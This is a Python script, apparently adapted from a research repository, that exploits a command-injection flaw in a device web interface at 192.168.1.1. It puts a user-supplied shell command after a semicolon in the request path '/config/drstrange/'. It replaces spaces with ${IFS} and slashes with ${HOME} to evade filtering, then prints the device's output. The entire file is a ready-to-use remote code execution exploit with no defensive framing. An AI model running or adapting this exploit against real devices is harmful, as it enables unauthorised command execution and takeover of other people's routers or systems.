#!/usr/bin/env python3

# Modified from https://github.com/haoqi366/SDN_research

import socket
import sys


def send_raw_request(
        host: str, port: int, path_with_space: str, timeout: float | None = 10):
    # 验证路径格式（确保以/开头，避免协议解析问题）
    if not path_with_space.startswith('/'):
        path_with_space = '/' + path_with_space

    # 构造HTTP请求报文（严格遵循HTTP格式的换行符和结构）
    request = (
        f"GET {path_with_space} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: curl/1.0\r\n"  # 添加用户代理标识
        "Accept: */*\r\n"
        "Connection: close\r\n"  # 告知服务器响应后关闭连接
        "\r\n"  # 空行标识请求头结束
    )

    response_data = b""  # 存储完整响应数据
    sock = None

    try:
        # 创建TCP socket并设置超时
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        # 连接目标主机
        # print(f"正在连接 {host}:{port}...")
        sock.connect((host, port))

        # print("连接成功，发送请求...")

        # 发送请求（确保完整发送）
        bytes_sent = sock.sendall(request.encode())
        if bytes_sent is None:  # sendall成功时返回None
            print(f"请求发送完成")

        # 循环接收响应（处理大响应，直到连接关闭）
        print("开始接收响应...")
        while True:
            try:
                # 每次接收4KB数据
                chunk = sock.recv(4096)
                if not chunk:  # 收到空数据表示连接已关闭
                    break
                response_data += chunk
                # 打印接收进度（每接收1MB提示一次）
                if len(response_data) % (1024 * 1024) == 0:
                    print(f"已接收 {len(response_data)//(1024*1024)}MB 数据...")
            except socket.timeout:
                print("接收超时，停止等待更多数据")
                break

        print("\n==== 执行结果 ====\n")
        print(response_data.decode(), end='')
    except socket.timeout:
        print(f"错误：连接或接收超时（{timeout}秒）")
    except ConnectionRefusedError:
        print(f"错误：目标主机 {host}:{port} 拒绝连接")
    except socket.gaierror:
        print(f"错误：无法解析主机名 {host}")
    except Exception as e:
        print(f"发生意外错误：{str(e)}")


if __name__ == "__main__":
    target_host = "192.168.1.1"
    target_port = 80
    target_path = "/config/drstrange/;{}"

    cmd = ' '.join(sys.argv[1:])
    query = f'{cmd}>&2'.replace(' ', '${IFS}').replace('/', '${HOME}')
    send_raw_request(target_host, target_port, target_path.format(query))
